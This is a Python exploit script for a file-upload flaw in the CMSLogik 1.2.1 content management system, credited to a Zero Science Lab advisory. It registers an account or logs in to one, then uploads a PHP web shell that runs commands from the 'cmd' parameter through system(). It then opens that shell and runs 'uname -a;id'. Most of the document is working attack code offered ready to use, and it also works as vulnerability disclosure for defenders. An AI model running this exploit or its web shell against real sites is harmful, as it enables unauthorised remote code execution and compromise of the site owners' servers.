#!/usr/bin/python
#
# CMSLogik 1.2.1 (upload_file_ajax()) Shell Upload Exploit
#
#
# Vendor: ThemeLogik
# Product web page: http://www.themelogik.com/cmslogik
# Affected version: 1.2.1 and 1.2.0
#
# Summary: CMSLogik is built on a solid & lightweight framework
# called CodeIgniter, and design powered by Bootstrap. This
# combination allows for greater security, extensive flexibility,
# and ease of use. You can use CMSLogik for almost any niche that
# your project might fall into.
#
# Desc: The vulnerability is caused due to the improper verification
# of uploaded files in '/application/controllers/support.php' script
# thru the 'upload_file_ajax()' function. This can be exploited to
# execute arbitrary PHP code by uploading a malicious PHP script file
# with multiple extensions in the '/support_files' directory. Normal
# user [level 113] authentication required.
#
# ======================================================================
# /application/controllers/support.php:
# -------------------------
#
# 143: public function upload_file_ajax()
# 144: {
# 145:    $allowedExtensions = array('jpeg', 'jpg', 'gif', 'png', 'html', 'php', 'js', 'doc', 'docx', 'pdf', 'ppt', 'pps', 'pptx', 'ppsx');
# 146:    $sizeLimit = 10 * 1024;
# 147:    $params = array('extensions' => $allowedExtensions, 'size' => $sizeLimit);
# 148:    $this->load->library('qqfileuploader', $params);
# 149:
# 150:    $result = $this->qqfileuploader->handleUpload('./support_files');
# 151:
# 152:    echo htmlspecialchars(json_encode($result), ENT_NOQUOTES);
# 153: }
#
# ======================================================================
#
# Tested on: Apache/2.2.22
#            PHP/5.3.15
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2013-5138
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5138.php
#
#
# 05.04.2013
#

import json, re, sys
import urllib, urllib2, time
import cookielib, webbrowser

if len(sys.argv) < 3:
	print '\n\n\x20-\x20\x20[*] Usage: ' +sys.argv[0]+ ' <target> <path>\n'
	print '\n\x20-\x20\x20[*] Example: ' +sys.argv[0]+ ' example.com cmslogik\n'
	sys.exit(0)
	
host = sys.argv[1]
path = sys.argv[2]

def reguser():
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	username = raw_input('[+] Enter username [at least 4 characters]: ')
	chk_usr = urllib.urlencode({'user' : username})
	try:
		xhr = json.load(opener.open('http://' +host+ '/' +path+ '/main/unique_username_ajax', chk_usr))
		for key, value in xhr.iteritems():
			fnrand = value
			break
		if fnrand == '1':
			print '[!] The user ' +username+ ' is not available.'
			print '[!] Choose a more unique username please.'
			reguser()
	except:
		print '[!] No connection to host'
		sys.exit(0)
	else:
		print '[*] The user \'' +username+ '\' is available.'
		email = raw_input('[+] Choose e-mail [unique@unique.unique]: ')
		password = raw_input('[+] Choose password [at least 6 characters]: ')
		reg_data = urllib.urlencode({'email' : email,
					     'full_name' : 'Patch',
					     'password1' : password,
					     'password2' : password,
					     'r_username' : username,
					     'register' : 'Register!'}
					     )
		auth = opener.open('http://' +host+ '/' +path+ '/register', reg_data)
		match = auth.read()
		if re.search(r"Sorry but that Email is already in use!", match):
			print '[!] The e-mail you have chosen is already taken. Try again.'
			reguser()
		elif re.search(r"You have been registered", match):
			print '[*] OK.'
			loguser()
		else:
			print '[!] Something is fishy.'
			sys.exit(0)
	
def loguser():
	print '\n[*] Login please.'
	username = raw_input('\n[+] Enter your username: ')
	password = raw_input('[+] Enter your password: ')
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	login_data = urllib.urlencode({'username' : username,
				       'password' : password,
				       'login' : 'Login',
				       'remember_me' : 'remember'}
				       )
	auth = opener.open('http://' +host+ '/' +path+ '/login', login_data)
	match = auth.read()
	if re.search(r"Error!", match):
		print '\n[!] Not logged in! Try again.'
		loguser()
	else:
		print '\n[*] Successfully logged in!'
		print '[*] Uploading malicious php file...'
		time.sleep(3)
		upload_data = '<?php echo \'<pre>\' + system($_GET[\'cmd\']) + \'</pre>\'; ?>'
		xhr2 = json.load(opener.open('http://' +host+ '/' +path+ '//support/upload_file_ajax?qqfile=liwo_sh.php', upload_data))
		for key, value in xhr2.iteritems():
			filename = value
			break
		print '[*] Your shell ID is: ' + filename + '.php'
		time.sleep(2)
		print '[*] Let me open that for ya...'
		time.sleep(2)
		webbrowser.open('http://' +host+ '/' +path+ '/support_files/' +filename+ '.php?cmd=uname -a;id')
		print '\n[*] Zya!'
		sys.exit(0)

def menu():
	print """
(((((((((((((((((((((((((((((((((((((((((((((((((((
((                                               ((
((	Hello! CMSLogik Shell Upload 0day        ((
((                                               ((
((	1. Register a new User                   ((
((	2. Login with existing User              ((
((                                               ((
(((((((((((((((((((((((((((((((((((((((((((((((((((

	"""
	n = raw_input('Enter choice number: ');
	if n=='1':
		print '\n[*] Welcome to User Registration!'
		reguser()
	elif n=='2':
		loguser()
	else:
		print '\n[?] Just 1 or 2 please...'
		menu()
menu()
